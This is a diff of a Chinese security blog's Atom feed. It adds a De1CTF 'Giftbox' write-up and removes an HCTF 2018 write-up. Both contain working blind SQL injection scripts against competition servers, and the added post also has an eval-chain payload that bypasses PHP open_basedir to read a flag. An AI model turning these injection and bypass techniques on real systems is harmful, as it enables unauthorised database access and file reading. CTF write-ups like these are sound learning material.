@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://hpdoger.cn/"/>
-  <updated>2019-07-30T01:21:54.656Z</updated>
+  <updated>2019-08-06T03:09:32.250Z</updated>
   <id>https://hpdoger.cn/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>De1CTF-Giftbox题解</title>
+    <link href="https://hpdoger.cn/2019/08/06/De1CTF-Giftbox%E9%A2%98%E8%A7%A3/"/>
+    <id>https://hpdoger.cn/2019/08/06/De1CTF-Giftbox题解/</id>
+    <published>2019-08-05T16:00:00.000Z</published>
+    <updated>2019-08-06T03:09:32.250Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="De1CTF-Giftbox题解"><a href="#De1CTF-Giftbox题解" class="headerlink" title="De1CTF-Giftbox题解"></a>De1CTF-Giftbox题解</h1><p>这次Web题的难度有阶层，<code>SSRF Me</code>是一个验签的绕过调用python的url_open进行ssrf请求、web4是一道n1ctf的原题，也懒得写wp了。还有两道比较难的，一道是ZSX师傅出的calc，统一三个后端的输出结果，过滤了括号。还有一道魔改了ciscn——2019的滑稽云，更改了溢出区的大小+外带结果。</p><p>最后就是Giftbox，不得不说，这是我见过最有小情调的ctf题目。做了一个伪unix页面，存在几个bash命令，和一个登陆功能，在登陆处存在sql注入(需要经过双因子认证)。比赛的时候没做出来，趁着赛题没关复现一下(顺便膜爆恩泽师傅orz..)</p><p><img src="http://static.zybuluo.com/1160307775/fa8kq5dg6w9kvypaq7gmtn5d/image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png" alt="image_1dhfn1f0b1ogo5fs163rsqk1c0a9.png-979.2kB"></p><h2 id="双因子认证"><a href="#双因子认证" class="headerlink" title="双因子认证"></a>双因子认证</h2><p>这种认证第一次见，其实是调用pyotp模块去验证，随便输入会报错<br><img src="http://static.zybuluo.com/1160307775/yqxk48t3uo4tmzrgjt4d30kg/image_1dhfn759ve4c17uv1eqv1rpq876m.png" alt="image_1dhfn759ve4c17uv1eqv1rpq876m.png-203.2kB"></p><p>既然是前端发送验证请求，那就应该存在发送的ajax请求包。重点在开发者nodets和请求形式。它提示我们后端用了pyotp.zip的库去验证，而且在请求形式中把secret_key给了我们:<code>GAXG24JTMZXGKZBU</code></p><p><img src="http://static.zybuluo.com/1160307775/apyakaxxoilaq4ixhqk9ss1u/image_1dhfn9snj1dtme3d11eea3nm2v13.png" alt="image_1dhfn9snj1dtme3d11eea3nm2v13.png-165.3kB"></p><p>队内师傅提醒说，python3的pyotp模块也可以根据key生成验证<br><img src="http://static.zybuluo.com/1160307775/k5n1ymx6sv0p2188k8r01wr3/image_1dhfniaosich1f5b1ptm1jk8t4s1g.png" alt="image_1dhfniaosich1f5b1ptm1jk8t4s1g.png-140.6kB"></p><p>赛后看到天枢的师傅用xhr发送请求，即前端爆破就可以直接调用topt函数，也是种不错的思路，学习了。</p><p>接着就是一个简单的注入</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>脚本如下，空格会导致程序判断为参数分隔符，所以用/**/替代</p><pre><code>#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsimport pyotp as pyotpimport stringtotp = pyotp.TOTP(&#39;GAXG24JTMZXGKZBU&#39;, 8, interval=5)def curl(payload):    r = requests.post(&#39;http://222.85.25.41:8090/shell.php&#39;, params={&#39;a&#39;: &#39;login admin\&#39;/**/and/**/(&#39; + payload + &#39;)/**/and/**/\&#39;1\&#39;=\&#39;1 admin&#39;, &#39;totp&#39;: totp.now()},                      data={&#39;dir&#39;: &#39;/&#39;, &#39;pos&#39;: &#39;/&#39;, &#39;filename&#39;: &#39;usage.md&#39;})    if &#39;password&#39; in r.text:        return True    else:        return Falsedef sqli():    for i in range(0, 2):        # db_data = &quot;SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        # db_data = &quot;SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\&#39;giftbox\&#39;/**/and/**/table_name=\&#39;users\&#39;/**/LIMIT/**/{},1&quot;.format(        #     i)        db_data = &quot;select/**/password/**/from/**/giftbox.users/**/where/**/username/**/=/**/&#39;admin&#39;/**/limit/**/{},1&quot;.format(            i)        db_res = &quot;&quot;        for y in range(1, 64):            for c in string.printable:                db_res_payload = &quot;substr((&quot; + db_data + &quot;),%d,1)/**/=/**/&#39;%s&#39;&quot; % (y,c)                if curl(db_res_payload):                    db_res += c                    print(&quot;&gt; &quot; + db_res)                    break                else:pass            if db_res == &quot;&quot;:                breakif __name__ == &#39;__main__&#39;:    sqli()</code></pre><p>最后注入password字段得到一个hint为<code>hinT{g1ve_u_hi33en_c0mm3nd-sh0w_hiiintttt_23333}</code>，登陆成功同时提示</p><p><img src="http://static.zybuluo.com/1160307775/y3uyi4qslzpihrrxqpk5w7x1/image_1dhi8qiij18ve18991q95u1skfb1m.png" alt="image_1dhi8qiij18ve18991q95u1skfb1m.png-86kB"></p><h2 id="Bypass-open-dir"><a href="#Bypass-open-dir" class="headerlink" title="Bypass open_dir"></a>Bypass open_dir</h2><p>同时题目存在targeting命令，具体用法如下。结合之前的提示，推测是对每一个target进行一次eval的操作，因为targeting不允许存在双引号，所以用复杂变量${xxx(xxx)}的形式代替</p><p><img src="http://static.zybuluo.com/1160307775/4q86j7w2c84e21wjkvrk4bsr/image_1dhic3q29as9fln24sr29vts9.png" alt="image_1dhic3q29as9fln24sr29vts9.png-411.3kB"></p><p>但是没有执行到system(whoami)，推测是有open_dir，用网上的方法bypass:<a href="https://www.4hou.com/web/17357.html" target="_blank" rel="noopener">从PHP底层看open_basedir bypass</a></p><p>最后的payload如下，因为有长度限制，进行变量拼接</p><pre><code>targeting a chdirtargeting b csstargeting c {$a($b)}targeting d ini_settargeting e open_basedirtargeting f ..targeting g {$d($e,$f)}targeting h {$a($f)}targeting i {$a($f)}targeting j base64_targeting k decodetargeting l $j$ktargeting m Ly8vtargeting n {$l($m)}targeting o {$d($e,$n)}targeting p print_rtargeting q file_get_targeting r contentstargeting s $q$rtargeting t flagtargeting u {$p($s($t))}launch</code></pre><p><img src="http://static.zybuluo.com/1160307775/uefh1iezrvio5k3p7kn68w9o/image_1dhiec48lrbmsku1m3eu9pbjm2p.png" alt="image_1dhiec48lrbmsku1m3eu9pbjm2p.png-128.9kB"></p><p>再次膜恩泽师傅..</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;a href=&quot;#De1CTF-Giftbox题解&quot; class=&quot;headerlink&quot; title=&quot;De1CTF-Giftbox题解&quot;&gt;&lt;/a&gt;De1CTF-Giftbox题解&lt;/h1&gt;&lt;p&gt;这次Web题的难度有阶层，&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
+    
+      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>CISCN 2019 Final Web11题解</title>
@@ -467,31 +492,6 @@
     
     
       <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HCTF2018线上赛部分WriteUp</title>
-    <link href="https://hpdoger.cn/2018/11/13/HCTF%E9%A2%98%E8%A7%A3/"/>
-    <id>https://hpdoger.cn/2018/11/13/HCTF题解/</id>
-    <published>2018-11-12T16:00:00.000Z</published>
-    <updated>2019-01-08T03:14:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="HCTF题解"><a href="#HCTF题解" class="headerlink" title="HCTF题解"></a>HCTF题解</h1><h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>提示只有admin才能查看</p><p>注册账号功能，发现注册大写和小写会提示重名注册。<br>也就是说 ADMIN&lt;=&gt;admin</p><p>有一篇文章将Unicode安全，提到的一个python函数canonical_username，这个函数会把类似的unicode字符做一个与chrome的地址栏里相似的转换，举个例子<br>BIG会被转换为big。ᴬᴬᴬ，经过函数处理<br>后变成了AAA</p><ol><li>我们注册形似ADMIN的名字</li><li>后台函数处理把形似ADMIN转换为ADMIN</li><li>修改ADMIN的密码，相当于修改admin的密码</li><li>登陆admin获得flag</li></ol><p>相当于一个越权</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>Unicode安全：<a href="http://blog.lnyas.xyz/?p=1411" target="_blank" rel="noopener">http://blog.lnyas.xyz/?p=1411</a><br>Unicode近似字合集:<a href="https://www.compart.com/en/unicode/category/Lm" target="_blank" rel="noopener">https://www.compart.com/en/unicode/category/Lm</a></p><h1 id="kznoe"><a href="#kznoe" class="headerlink" title="kznoe"></a>kznoe</h1><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>拿到题目发现砝码泄露,down了一份<a href="http://www.zip开始审" target="_blank" rel="noopener">www.zip开始审</a></p><p>一眼看到sql文件，打开看看执行了哪些语句，发现后台账号密码</p><pre><code>INSERT INTO `fish_admin` (`id`, `username`, `password`, `name`, `qq`, `per`) VALUES(1, &#39;admin&#39;, &#39;21232f297a57a5a743894a0e4a801fc3&#39;, &#39;小杰&#39;, &#39;1503816935&#39;, 1);</code></pre><p>登陆失败，被改了密码，开始审计</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>整个钓鱼网站的大致结构：<br><img src="https://i.loli.net/2018/11/13/5beac350d6b8e.png" alt><br>根目录index.php跳转页</p><h3 id="admin目录"><a href="#admin目录" class="headerlink" title="admin目录"></a>admin目录</h3><p>admin目录下是钓鱼后台的管理,login逻辑判断登陆</p><h3 id="include目录。"><a href="#include目录。" class="headerlink" title="include目录。"></a>include目录。</h3><p>include下是配置文件，common入口文件包含了过滤和验证内容，其中:</p><ol><li>safe.php写了过滤规则，任何GET\POST\COOKIE请求的参数会经过filter<pre><code>function waf($string){ $blacklist = &#39;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#39;; // and updatexml(1,concat(0x7e,database()) return preg_replace_callback($blacklist, function ($match) {     return &#39;@&#39; . $match[0] . &#39;@&#39;; }, $string);}</code></pre></li></ol><p>function safe($string)<br>{<br>    if (is_array($string)) {<br>        foreach ($string as $key =&gt; $val) {<br>            $string[$key] = safe($val);<br>        }<br>    } else {<br>        $string = waf($string);<br>    }<br>    return $string;<br>}</p><pre><code>匹配到这些会在关键字前后添加@2. member根据cookie判断是否已经登陆3. founction封装了一些功能函数4. db.class一些执行的sql语句## 思路### ip刚开始审的时候看到了insert把ip入库，而且ip的获取是这样的：![](https://i.loli.net/2018/11/13/5beac380388eb.jpg)不用经过safe的过滤，但是下面的ip2long会把超限度的ip置空，因此ip注入行不通### bypass因为有全局过滤safe，所以一开始在想可不可以bypass掉，用hex绕过is_number的检测，使我们注入的语句不会经过filter。确实成功执行了我用hex传入的语句，但是mysql仅仅是把hex的值入库了，也无法进行二次利用。### member.php当时他们说可以用json形式的cookie注入,unicode编码绕过于是去看cookie逻辑登陆的地方![](https://i.loli.net/2018/11/13/5beac35ebedb4.png)cookie传入参数login_data解析查库，用了json_decode，那么就可以用unicode编码无视过滤![](https://i.loli.net/2018/11/13/5beac38e39abe.png)剩下的就是编写tamper脚本了，把payload替换成unicode。但是看到了微笑师傅的一个py脚本，不借助sqlmap，觉得写的很好，贴出来</code></pre><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import requests<br>import string</p><p>url = ‘<a href="http://kzone.2018.hctf.io/include/common.php&#39;" target="_blank" rel="noopener">http://kzone.2018.hctf.io/include/common.php&#39;</a><br>str1 = string.ascii_letters+string.digits+’{}!@#$*&amp;_,’</p><p>def check(payload):<br>    cookie={<br>        ‘PHPSESSID’:’8ehnp28ccr4ueh3gnfc3uqtau1’,<br>        ‘islogin’:’1’,<br>        ‘login_data’:payload<br>    }<br>    try:<br>        requests.get(url,cookies=cookie,timeout=3)<br>        return 0<br>    except:<br>        return 1</p><p>result=’’<br>for i in range(1,33):<br>    for j in str1:<br>        payload = ‘{“admin_user”:”admin&#39;/<strong>/and/</strong>/\u0069f(\u0061scii(\u0073ubstr((select/<strong>/table_name/</strong>/from/<strong>/inf\u006Frmation_schema.tables/</strong>/where/<strong>/table_schema\u003ddatabase()/</strong>/limit/<strong>/0,1),%s,1))\u003d&#39;%s&#39;,\u0073leep(4),1)/</strong>/and/<strong>/&#39;1”}’% (str(i),ord(j))<br>        payload = ‘{“admin_user”:”admin&#39;/</strong>/and/<strong>/\u0069f(\u0061scii(\u0073ubstr((select/</strong>/F1a9/<strong>/from/</strong>/F1444g),%s,1))\u003d%s,\u0073leep(4),1)/<strong>/and/</strong>/&#39;1”,”admin_pass”:”123”}’% (str(i),ord(j))<br>        #print(‘[+]’+payload)<br>        if check(payload):<br>            result += j<br>            break<br>    print(result)</p><pre><code>只要是请求的页面包含common.php此脚本都能行得通，因为会引入member.php</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;HCTF题解&quot;&gt;&lt;a href=&quot;#HCTF题解&quot; class=&quot;headerlink&quot; title=&quot;HCTF题解&quot;&gt;&lt;/a&gt;HCTF题解&lt;/h1&gt;&lt;h1 id=&quot;admin&quot;&gt;&lt;a href=&quot;#admin&quot; class=&quot;headerlink&quot; title=
-      
-    
-    </summary>
-    
-    
-      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
-    
-      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
     
   </entry>
   
